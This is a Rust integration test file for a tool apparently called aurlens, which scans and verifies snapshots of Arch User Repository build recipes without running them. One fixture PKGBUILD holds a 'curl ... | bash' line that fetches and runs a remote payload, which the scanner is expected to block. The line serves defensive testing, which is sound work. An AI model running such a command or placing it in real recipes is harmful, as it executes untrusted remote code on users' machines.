use aurlens::{VerificationStatus, verify_snapshot};
use serde_json::{Value, json};
use std::fs;
use std::os::unix::fs::{PermissionsExt, symlink};
use std::path::Path;
use std::process::{Command, Output};
use tempfile::{TempDir, tempdir};

fn package(source: &str) -> TempDir {
    let root = tempdir().unwrap();
    fs::write(root.path().join("PKGBUILD"), source).unwrap();
    fs::write(
        root.path().join("helper.install"),
        "post_install() { :; }\n",
    )
    .unwrap();
    root
}

fn command() -> Command {
    Command::new(
        std::env::var_os("AURLENS_VERIFY_BIN")
            .unwrap_or_else(|| env!("CARGO_BIN_EXE_aurlens").into()),
    )
}

fn scanned_digest(path: &Path, exit_code: i32) -> String {
    let output = command()
        .arg("scan")
        .arg(path)
        .arg("--json")
        .output()
        .unwrap();
    assert_eq!(output.status.code(), Some(exit_code));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(report["coverage"]["complete"], true);
    assert_eq!(report["revalidated"], true);
    report["snapshot_digest"].as_str().unwrap().into()
}

fn verify(path: &Path, digest: &str, json: bool) -> Output {
    let mut cmd = command();
    cmd.arg("verify")
        .arg(path)
        .arg("--snapshot-digest")
        .arg(digest);
    if json {
        cmd.arg("--json");
    }
    cmd.output().unwrap()
}

fn report(output: &Output, status: &str, exit_code: i32) -> Value {
    assert_eq!(output.status.code(), Some(exit_code));
    assert!(output.stderr.is_empty(), "{:?}", output.stderr);
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(report["schema_version"], 1);
    assert_eq!(report["operation"], "verify_snapshot");
    assert_eq!(report["status"], status);
    assert_eq!(report["exit_code"], exit_code);
    report
}

#[test]
fn unchanged_scan_snapshot_matches_without_executing_recipe() {
    let root = package("pkgname=example\ntouch should-never-exist\n");
    fs::write(root.path().join("ai.toml"), "invalid AI configuration").unwrap();
    let digest = scanned_digest(root.path(), 0);
    let result = report(&verify(root.path(), &digest, true), "matched", 0);
    assert_eq!(result["expected_digest"], digest);
    assert_eq!(result["snapshot_digest"], digest);
    assert_eq!(result["issues"], json!([]));
    assert_eq!(result.as_object().unwrap().len(), 8);
    assert!(!root.path().join("should-never-exist").exists());

    let result = verify_snapshot(root.path(), &digest);
    assert_eq!(result.status, VerificationStatus::Matched);
    assert_eq!(result.exit_code, 0);
}

#[test]
fn blocked_recipe_can_match_and_requires_separate_review_decision_check() {
    let root = package("curl https://example.invalid/payload | bash\ntouch should-never-exist\n");
    let digest = scanned_digest(root.path(), 2);
    let result = report(&verify(root.path(), &digest, true), "matched", 0);
    assert!(
        result["notice"]
            .as_str()
            .unwrap()
            .contains("not a safety certificate")
    );
    assert!(
        result["notice"]
            .as_str()
            .unwrap()
            .contains("initial review decision must be checked separately")
    );
    assert!(result.get("decision").is_none());
    assert!(!root.path().join("should-never-exist").exists());
}

#[test]
fn content_modes_empty_directories_additions_and_deletions_change_digest() {
    type Mutation = (&'static str, fn(&Path));
    let mutations: &[Mutation] = &[
        ("content", |root| {
            fs::write(root.join("PKGBUILD"), "pkgname=changed\n").unwrap()
        }),
        ("file_mode", |root| {
            fs::set_permissions(root.join("PKGBUILD"), fs::Permissions::from_mode(0o755)).unwrap()
        }),
        ("root_mode", |root| {
            fs::set_permissions(root, fs::Permissions::from_mode(0o755)).unwrap()
        }),
        ("empty_directory_added", |root| {
            fs::create_dir(root.join("added")).unwrap()
        }),
        ("empty_directory_deleted", |root| {
            fs::remove_dir(root.join("empty")).unwrap()
        }),
        ("empty_directory_mode", |root| {
            fs::set_permissions(root.join("empty"), fs::Permissions::from_mode(0o700)).unwrap()
        }),
        ("file_added", |root| {
            fs::write(root.join("added.install"), "new\n").unwrap()
        }),
        ("file_deleted", |root| {
            fs::remove_file(root.join("helper.install")).unwrap()
        }),
    ];
    for (name, mutate) in mutations {
        let root = package("pkgname=example\n");
        fs::set_permissions(root.path(), fs::Permissions::from_mode(0o700)).unwrap();
        fs::set_permissions(
            root.path().join("PKGBUILD"),
            fs::Permissions::from_mode(0o644),
        )
        .unwrap();
        fs::create_dir(root.path().join("empty")).unwrap();
        fs::set_permissions(root.path().join("empty"), fs::Permissions::from_mode(0o755)).unwrap();
        let digest = scanned_digest(root.path(), 0);
        mutate(root.path());
        let result = report(&verify(root.path(), &digest, true), "changed", 3);
        assert_eq!(result["expected_digest"], digest, "{name}");
        assert_ne!(result["snapshot_digest"], digest, "{name}");
        assert!(result["snapshot_digest"].is_string(), "{name}");
        assert_eq!(result["issues"], json!(["snapshot_changed"]), "{name}");
    }
}

#[test]
fn symlinks_are_incomplete_without_leaking_external_contents() {
    let root = package("pkgname=example\n");
    let digest = scanned_digest(root.path(), 0);
    let outside = tempdir().unwrap();
    let secret = outside.path().join("secret");
    fs::write(&secret, "UNRELATED_PRIVATE_SENTINEL").unwrap();
    symlink(&secret, root.path().join("linked.install")).unwrap();
    let output = verify(root.path(), &digest, true);
    let result = report(&output, "incomplete", 3);
    assert_eq!(result["snapshot_digest"], Value::Null);
    assert_eq!(result["issues"], json!(["symlink"]));
    assert!(
        !String::from_utf8(output.stdout)
            .unwrap()
            .contains("UNRELATED_PRIVATE_SENTINEL")
    );

    let linked_root = outside.path().join("linked-root");
    symlink(root.path(), &linked_root).unwrap();
    let result = report(&verify(&linked_root, &digest, true), "incomplete", 3);
    assert_eq!(result["issues"], json!(["symlink"]));
}

#[test]
fn malformed_digest_is_reported_before_filesystem_traversal() {
    let root = tempdir().unwrap();
    let missing = root.path().join("missing");
    for digest in [
        String::new(),
        "a".repeat(63),
        "a".repeat(65),
        "A".repeat(64),
        "g".repeat(64),
        format!("{}\n", "a".repeat(63)),
        "é".repeat(32),
    ] {
        let result = report(&verify(&missing, &digest, true), "incomplete", 3);
        assert_eq!(result["expected_digest"], digest);
        assert_eq!(result["snapshot_digest"], Value::Null);
        assert_eq!(result["issues"], json!(["invalid_snapshot_digest"]));
    }
}

#[test]
fn invalid_paths_and_unsupported_inputs_emit_machine_reports() {
    let root = tempdir().unwrap();
    let digest = "0".repeat(64);
    let result = report(
        &verify(&root.path().join("missing"), &digest, true),
        "incomplete",
        3,
    );
    assert_eq!(result["issues"], json!(["filesystem_error"]));
    fs::write(root.path().join("file"), "not a directory").unwrap();
    let result = report(
        &verify(&root.path().join("file"), &digest, true),
        "incomplete",
        3,
    );
    assert_eq!(result["issues"], json!(["root_not_directory"]));
    let result = report(&verify(root.path(), &digest, true), "incomplete", 3);
    assert_eq!(result["issues"], json!(["missing_pkgbuild"]));

    let root = package("pkgname=example\n");
    fs::write(root.path().join("binary"), [0_u8, 255]).unwrap();
    let result = report(&verify(root.path(), &digest, true), "incomplete", 3);
    assert_eq!(result["issues"], json!(["unsupported_text"]));
}

#[test]
fn default_collector_limits_are_enforced() {
    let root = package("pkgname=example\n");
    for index in 0..256 {
        fs::write(root.path().join(format!("helper-{index}")), "helper\n").unwrap();
    }
    let result = report(&verify(root.path(), &"0".repeat(64), true), "incomplete", 3);
    assert_eq!(result["issues"], json!(["file_limit"]));
}

#[test]
fn human_output_reports_each_status_and_the_execution_notice() {
    let root = package("pkgname=example\n");
    let digest = scanned_digest(root.path(), 0);
    for (digest, status, exit_code) in [
        (digest, "matched", 0),
        ("0".repeat(64), "changed", 3),
        ("invalid".into(), "incomplete", 3),
    ] {
        let output = verify(root.path(), &digest, false);
        assert_eq!(output.status.code(), Some(exit_code));
        let text = String::from_utf8(output.stdout).unwrap();
        assert!(text.contains(&format!("AURLens snapshot: {status}")));
        assert!(text.contains("not a safety certificate"));
    }
}

#[test]
fn cli_requires_digest_and_has_no_ai_configuration_option() {
    let root = package("pkgname=example\n");
    let output = command()
        .arg("verify")
        .arg(root.path())
        .arg("--json")
        .output()
        .unwrap();
    assert_eq!(output.status.code(), Some(2));
    let output = command()
        .arg("verify")
        .arg(root.path())
        .args([
            "--snapshot-digest",
            &"0".repeat(64),
            "--config",
            "ai.toml",
            "--json",
        ])
        .output()
        .unwrap();
    assert_eq!(output.status.code(), Some(2));
}
